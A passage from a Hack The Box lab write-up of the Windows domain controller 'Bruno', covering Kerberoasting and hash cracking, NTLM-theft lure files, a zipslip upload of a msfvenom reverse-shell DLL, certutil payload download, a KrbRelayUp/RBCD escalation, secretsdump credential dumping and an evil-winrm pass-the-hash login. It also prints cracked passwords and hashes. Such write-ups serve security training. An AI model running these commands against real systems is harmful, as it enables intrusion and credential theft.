1cd65b649685baa26336e80707856ed948a43890501aafbf777ccd6f1b9e5fe0bb3f47393cd990f323f873ad529902fc79e234c9f6e0c901b9c33abf418a0e9395b9d5625e6c31a58c9772a422bd736daf6b4fde287df975c9d27275908f60dd481fcc24251a47118d66372b6d3c0262bceb9a6cb95310ee23d6a
+LDAP        10.129.11.5     389    BRUNODC          [*] sAMAccountName: svc_scan, memberOf: [], pwdLastSet: 2022-06-29 14:36:15.210348, lastLogon: 2026-03-28 16:55:31.623846
+LDAP        10.129.11.5     389    BRUNODC          $krb5tgs$23$*svc_scan$BRUNO.VL$bruno.vl\svc_scan*$15a168063d05e2ccc45f6ef200f6c3e2$76f50aa8ac101142c2a6f91350f77b048490544105e1b71fc7d56f9c9d0f52cae468e8d7089831e980f92820e2f521cfd04b245fc9bc4cf664b35048eb339ddd02211528e9648c2ec0efb0c44c6822a0f362bd0c7ce83d86713ba356c4bc25392259a6e6b6006ad5aecf0e1f97a9599f95115a0765faf3d362a7650067fcd2ce3066bfcda356005d68019c3a9f518baa2a538617d3d1b256f8685bc77e6e7a4ebf0cac0de105d4f365d2ae7b474bfb3acee2c47703c0781535f1133efbd4df698cc8198f3fe365dd4d198fefd5211987815b29a96ac9af732687a295c368b889aae0d6541f1a1afc519799d36071c960dd0281227ee512d0e9ca3b7e626cec3ffa781bb72b55d0412ab35b6fc20bf4ba6d1fe6701dc2e34eb932702587b15c4d1f623a352275ea443c8cc33761ed1a393ef05cdda9499143ccdd6c5a58a860561027c7e8915e7020e3a8d54011056e5c0043fa299d5f5ac99db5f8672d8a735556b91f3a754d33c841cb1a94f986e82206a0dea124a3a9bae456c3a0f74fb495c5ca372801b54a735d06224890a27210e668451b6f5741277d8af8e304dafb646bad98129b5c957568618dd658abc5041b2bd44c14081f2e4620322d552c3efca1b597532bf5bedb003934f3679c84753f4eb4732ebe824648522d79c2e4f0217c6448a6525eef424f71d4460b1c31a9d0a0052cc152219bc765ae41a2d3a547d7d448e0077ffad3fef1ad9272cc0fc1f6472c5a8c7a855a8ebde078bfcfebde622f304382e72724f93d2ddc372505f19534824fdbfe9ec0526d2d08821af55167d1fdbfe4e4e39feab3edf00d64040475c4b20f67c9994f1524d6edea6741cc4c85d71239611166c26e06a0bb04f2691f83022ec81c8b9b624b035833753befb7b8fa4678d7a2f349b8006c2e7aa8846e082ca72ee0530a8c39439cfbbc7d8c5b9f323903c76d826f5176215c1fb7f107e18df7291788fba53a55ab5f891f7278dbef0b7e525172f063890c324015a31ce273da12594face0e1e13868e0bc8d5110d4f26a1b3df95fd20c6c3dc3a3bc89765572d90917bba97264ae9552b03d5c40569dd4c2ba768c41eeb6832aa3701646e2bdfaf4af1b78a89291b3732d76b7e0d836d2739f07a478f081acff2d3a79dcc9f7b475e69d023af5ae712e28f49d0b77e1b6b810506f9a2c5d6f8fd3c9f79b35637db7a7d7fcc429fda1270a9c7fb6d7e6c9f9b1ddb495104412cce86d5b0323d7b69bca28bf38f40d98c8c0e9ec83d4f0e410503f44915b49bc58b94e2ddda3381ca52b1e5fb5821b9b7fd3a6f212d0077bd6b13edf33dcf43fe603de815a202f37d2294c2676a89a3cf82234906e3c78f2916c380f5bba95dc6ce10dc72240edf14128a5a0012d9c2dd54545ed939f01334ca2ed9ca1a20816048b62ab</code></pre><p>Retrieved the hash of the <code>svc_scan</code> user again as expected but also got the hash for the <code>svc_net</code> account</p><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat kerb.hashes /usr/share/wordlists/rockyou.txt
+
+$krb5tgs$23$*svc_net$BRUNO.VL$bruno.vl\svc_net*$bfb567d3e5196a151d370162a91fa067$478cdf00ebb6cb9de4388dadadd086b05cba29c43ee1db6fc30771246b59b84159fa71adc28c1a2c202dac3669e06dc062892fabe42a6ba6844e6c0b792da7e64faa4777eb119c1aa80b775d9af0a5344fec7994831d947186a1a27119e9a56590fdafddce077c73845efa4652f0111d6d48f9118c0058c96a6d25c7fa8422d007e691b38460649f1fd1ccd281163cfe456450347f162536876dcd10216068389af65d59d3537889730222a71131b1c41d0689036460df1316b8afd82ff78cbe71223cfea8154e336b6096b4a22acf962f74900e0ccbed4b42d654b0caa83a97e7986df7f55e2a6ea70e16027a17ffcb6bb1c5ecce29fd5066e2689f3ba62a2a296028912fff106da89540a38fa678a29b02de4f0b1e5ad317f61dfa4ccb4edb468a429b73a9e39bcd1c50a90cf1adb8bc3d82feed0579b125735663a23835a2c1a1c644ea31a6756830453c0c889ad048c9a6e0ebfce367a90e3a1769ea07d4328d0cdbf3a6a1f7cb8cedacba6bc6f35652311d04f2ab8a37d7f2f68917fd0b99dc5ba505a3e28ba426ad0230d7be10820a7860a3fbac1d1d8de9aadaca86894437802692bac76b1995a690816abb0caf7d283908dbd1d36cb47bc7b4f540f856ecaec103a8178c5340a747cb849025868481c061e4608ed30d997cd8c8fde929a8cb7dd9ee770898ce47f71e98826bd82beb3cfa7acd03cd2bec45bea2f02f58698ec4c2a2aa05f7fe64ca80345530e1c1b450009cd6f16059dae3befbf28bf58a8a52ee2f52d6f93b982c0d8a6d2f41147d62194119c23ead4fba66aa9c3e8ee60d7fe31e73505d1ed6ec95d5e255cf729040f7abfa5db525bdfc1e5f34aabfb92340ad84ba7a6f19f780e6ea207c10349920109a49c801ec5350bd52b46fbb55a13f88acdf5dd6b1c3cca284f10f9ab9951df6229e969b7356ad8ba3981d90d9aa7a7afb5168a94e50869c70b57add56a985386f5ffd686f6c642c5464102904f0cd1977b95638c206990ac7ab799802a3167bfbb1f66e6eb5de703446c4b8fb189652d1aa623cf8b8be4f4a77e7301c6dcf93e487f21e23e59e8605fa84ddf69be0ebb503eed91a71be32866b0895b7029984656ee1312bd632390264ba43563190b595f17a94375185bcc60e395698f59ea9474d770f1098b54c63fa58e14af1ee281b970089a9c5ec21afb7be94c9fdfc83002e3ca4fc22854bcbffd03867a778cf6c5a48e34f3fa6dd78ed743b1416762e0201cd65b649685baa26336e80707856ed948a43890501aafbf777ccd6f1b9e5fe0bb3f47393cd990f323f873ad529902fc79e234c9f6e0c901b9c33abf418a0e9395b9d5625e6c31a58c9772a422bd736daf6b4fde287df975c9d27275908f60dd481fcc24251a47118d66372b6d3c0262bceb9a6cb95310ee23d6a:Sunshine1</code></pre><p>So the password is the same for this account</p><p>This new user <code>svc_net</code> has the same permissions on SMB</p><p>My next thought is if this password gets me access to two accounts it may give me more access to other users</p><p>After performing a password spray on all the users it was only these two that are compromised</p><h2>Watering hole attack (FAIL!)</h2><p>Since i have write access on <code>queue</code> i think im going to start there</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 ntlm_theft.py -g modern -s 10.10.14.90 -f meeting
+/home/kali/htb/bruno/ntlm_theft/ntlm_theft.py:168: SyntaxWarning: invalid escape sequence &#39;\l&#39;
+  location.href = &#39;ms-word:ofe|u|\\&#39;&#39;&#39; + server + &#39;&#39;&#39;\leak\leak.docx&#39;;
+Skipping SCF as it does not work on modern Windows
+Created: meeting/meeting-(url).url (BROWSE TO FOLDER)
+Created: meeting/meeting-(icon).url (BROWSE TO FOLDER)
+Created: meeting/meeting.lnk (BROWSE TO FOLDER)
+Created: meeting/meeting.rtf (OPEN)
+Created: meeting/meeting-(stylesheet).xml (OPEN)
+Created: meeting/meeting-(fulldocx).xml (OPEN)
+Created: meeting/meeting.htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(handler).htm (OPEN FROM DESKTOP WITH CHROME, IE OR EDGE)
+Created: meeting/meeting-(includepicture).docx (OPEN)
+Created: meeting/meeting-(remotetemplate).docx (OPEN)
+Created: meeting/meeting-(frameset).docx (OPEN)
+Created: meeting/meeting-(externalcell).xlsx (OPEN)
+Created: meeting/meeting.wax (OPEN)
+Created: meeting/meeting.m3u (OPEN IN WINDOWS MEDIA PLAYER ONLY)
+Created: meeting/meeting.asx (OPEN)
+Created: meeting/meeting.jnlp (OPEN)
+Created: meeting/meeting.application (DOWNLOAD AND OPEN)
+Created: meeting/meeting.pdf (OPEN AND ALLOW)
+Skipping zoom as it does not work on the latest versions
+Created: meeting/meeting.library-ms (BROWSE TO FOLDER)
+Skipping Autorun.inf as it does not work on modern Windows
+Skipping desktop.ini as it does not work on modern Windows
+Created: meeting/meeting.theme (THEME TO INSTALL
+Generation Complete.</code></pre><p>This generated files that ill plant in the SMB share</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient //brunodc.bruno.vl/queue -U &#39;svc_net&#39;%&#39;Sunshine1&#39;
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; prompt off
+smb: \&gt; mput meeting*
+putting file meeting-(externalcell).xlsx as \meeting-(externalcell).xlsx (121.7 kB/s) (average 121.7 kB/s)
+putting file meeting.library-ms as \meeting.library-ms (27.7 kB/s) (average 76.8 kB/s)
+putting file meeting.lnk as \meeting.lnk (48.0 kB/s) (average 67.3 kB/s)
+putting file meeting.m3u as \meeting.m3u (1.1 kB/s) (average 51.0 kB/s)
+putting file meeting-(frameset).docx as \meeting-(frameset).docx (203.7 kB/s) (average 83.9 kB/s)
+putting file meeting-(remotetemplate).docx as \meeting-(remotetemplate).docx (427.8 kB/s) (average 155.8 kB/s)
+putting file meeting.rtf as \meeting.rtf (2.3 kB/s) (average 135.4 kB/s)
+putting file meeting.htm as \meeting.htm (1.8 kB/s) (average 120.4 kB/s)
+putting file meeting-(handler).htm as \meeting-(handler).htm (2.5 kB/s) (average 107.9 kB/s)
+putting file meeting.application as \meeting.application (35.8 kB/s) (average 100.9 kB/s)
+putting file meeting.theme as \meeting.theme (36.8 kB/s) (average 95.3 kB/s)
+putting file meeting-(url).url as \meeting-(url).url (1.2 kB/s) (average 87.5 kB/s)
+putting file meeting.pdf as \meeting.pdf (16.3 kB/s) (average 82.0 kB/s)
+putting file meeting.asx as \meeting.asx (3.3 kB/s) (average 76.7 kB/s)
+putting file meeting-(stylesheet).xml as \meeting-(stylesheet).xml (3.7 kB/s) (average 72.2 kB/s)
+putting file meeting-(icon).url as \meeting-(icon).url (2.4 kB/s) (average 67.9 kB/s)
+putting file meeting.wax as \meeting.wax (1.3 kB/s) (average 64.2 kB/s)
+putting file meeting.jnlp as \meeting.jnlp (4.4 kB/s) (average 61.1 kB/s)
+putting file meeting-(fulldocx).xml as \meeting-(fulldocx).xml (854.0 kB/s) (average 134.4 kB/s)
+putting file meeting-(includepicture).docx as \meeting-(includepicture).docx (212.3 kB/s) (average 138.3 kB/s)
+smb: \&gt; </code></pre><p>After waiting a while no hash was returned!</p><h2>Shell access as <code>svc_scan</code></h2><p>After testing the functionality of the <code>dev</code> subdomain and with my current access on SMB i can upload things to the website using it</p><p>The page appears to be vulnerable to a zipslip</p><p>So initial tests tell me that if i upload a .zip after a while it extracts the contents and they are displayed on the page</p><p>Its also worth noting that the .zip file stays after the contents are extracted so that means the application will continue to extract the contents</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">cat zipslip.py 
+import zipfile
+with zipfile.ZipFile(&#39;samples.zip&#39;, &#39;w&#39;) as z:
+    # Path traversal to app directory
+    z.writestr(&#39;../app/hostfxr.dll&#39;, open(&#39;hostfxr.dll&#39;, &#39;rb&#39;).read())</code></pre><p>Ill use this short script to zip the file once ive created the shell</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=1337 -f dll -o hostfxr.dll
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of dll file: 9216 bytes
+Saved as: hostfxr.dll</code></pre><p>Next i can run the python script to zip the file which can then be uploaded</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 zipslip.py</code></pre><p>This created the zipfile which i can now upload via the <code>queue</code> share on SMB but first ill set a listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.1.231 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)</code></pre><p>In this case ill use penelope</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smb: \&gt; put samples.zip</code></pre><p>This planted the zipslip</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">penelope -p 1337
+[+] Listening for reverse shells on 0.0.0.0:1337 -&gt; 127.0.0.1 • 192.168.1.231 • 10.10.14.90
+➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
+[+] [New Reverse Shell] =&gt; BRUNODC 10.129.238.9 Microsoft_Windows_Server_2022_Datacenter-x64-based_PC 👤 bruno\svc_scan 😍️ Session ID &lt;1&gt;
+[+] Added readline support...
+[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
+[+] Session log: /home/ethan/.penelope/sessions/BRUNODC~10.129.238.9-Microsoft_Windows_Server_2022_Datacenter-x64-based_PC/2026_03_28-21_50_08-719.log
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+C:\Windows\system32&gt;whoami
+whoami
+bruno\svc_scan
+
+C:\Windows\system32&gt;
+</code></pre><p>Now i have a shell</p><h2>Domain admin</h2><p>First ill grab <code>krbrelayup</code> from github</p><p><a href="https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/KrbRelayUp.exe" target="_blank" rel="noreferrer">https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/KrbRelayUp.exe</a></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\svc_scan\Documents&gt; certutil -urlcache -split -f http://10.10.14.90:8000/KrbRelayUp.exe C:\Users\svc_scan\Documents\KrbRelayUp.exe</code></pre><p>This transferred this to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">.\KrbRelayUp.exe full -m rbcd -c -cls &#39;{d99e6e73-fc88-11d0-b498-00a0c90312f3}&#39;
+KrbRelayUp - Relaying you to SYSTEM
+
+
+[+] Rewriting function table
+[+] Rewriting PEB
+[+] Init COM server
+[+] Computer account &quot;KRBRELAYUP$&quot; added with password &quot;pK2=fZ5=yQ6@bK0@&quot;
+[+] Looking for available ports..
+[+] Port 10246 available
+[+] Register COM server
+[+] Forcing SYSTEM authentication
+[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...
+[+] LDAP session established
+[+] RBCD rights added successfully
+[+] TGT request successful!
+[+] Building S4U2self 
+[+] Using domain controller: brunodc.bruno.vl (fe80::6d16:7385:7694:82f3%5)
+[+] Sending S4U2self request to fe80::6d16:7385:7694:82f3%5:88
+[+] S4U2self success!
+[+] Got a TGS for &#39;Administrator&#39; to &#39;KRBRELAYUP$@BRUNO.VL&#39;
+[+] Impersonating user &#39;Administrator&#39; to target SPN &#39;HOST/BRUNODC&#39;
+[+] Building S4U2proxy request for service: &#39;HOST/BRUNODC&#39;
+[+] Using domain controller: brunodc.bruno.vl (fe80::6d16:7385:7694:82f3%5)
+[+] Sending S4U2proxy request to domain controller fe80::6d16:7385:7694:82f3%5:88
+[+] S4U2proxy success!
+[+] Importing ticket into a sacrificial process using CreateNetOnly
+[+] Process         : &#39;C:\Users\svc_scan\Documents\KrbRelayUp.exe krbscm --ServiceName &quot;KrbSCM&quot;&#39; successfully created with LOGON_TYPE = 9
+[+] ProcessID       : 348
+[+] Ticket successfully imported!
+[+] LUID            : 0x685960
+[+] System service should be started in background</code></pre><p>This has set up the RBCD</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">impacket-getST -impersonate &#39;administrator&#39; \
+  -spn &#39;cifs/BRUNODC.bruno.vl&#39; \
+  -dc-ip 10.129.11.177 \
+  &#39;bruno.vl/KRBRELAYUP$:pK2=fZ5=yQ6@bK0@&#39;
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in administrator@cifs_BRUNODC.bruno.vl@BRUNO.VL.ccache</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">export KRB5CCNAME=administrator@cifs_BRUNODC.bruno.vl@BRUNO.VL.ccache</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">impacket-secretsdump -k -no-pass BRUNODC.bruno.vl
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:850e9b2af4245da7880c3e57b3bd0dee:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+BRUNO\BRUNODC$:plain_password_hex:bef8d31d0b159e05ce5dbf6141b7e94517fbbf80bb130fe3bb965f66cd97dbaccfeaec78eb985cda4ced51b1eb779676e217ee0f12fccecd9679a87653f5f5e0b94ce117fa8c63ee374efee6aa55ccc74124e758b6007aaef15964ed94e99cab7d4b32776f5b862e2baa6a6e0bb5db9fc72f49a5f9013e4968240d7f7a06755c1558f50c34874e71f988d83bade80c2dfa9a0d3e3cac38ee24a2e353375bbcb2c1540b0ac9245cda18ab6ffa9708438503dc038bebbf0959bab1942ad4306606c1cdb9e0e7465ea6b955c1bd7e5a03a6fea5dc4d70ee57a6d7b9b9aca8ea295aea61b6c077fa10ab63962836a6c336af
+BRUNO\BRUNODC$:aad3b435b51404eeaad3b435b51404ee:4c1d8bc9a8067acf82233c7b6400234e:::
+.........[SNIP]</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i brunodc.bruno.vl -u charles.young -H &#39;3d50f4c837cef7cf5143767553b6cc19&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Charles.Young\Documents&gt; cd ../../Administrator/Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-ar---         3/29/2026   7:28 PM             34 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Domain admin!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-shibuya/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Shibuya</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-escape/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Escape</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
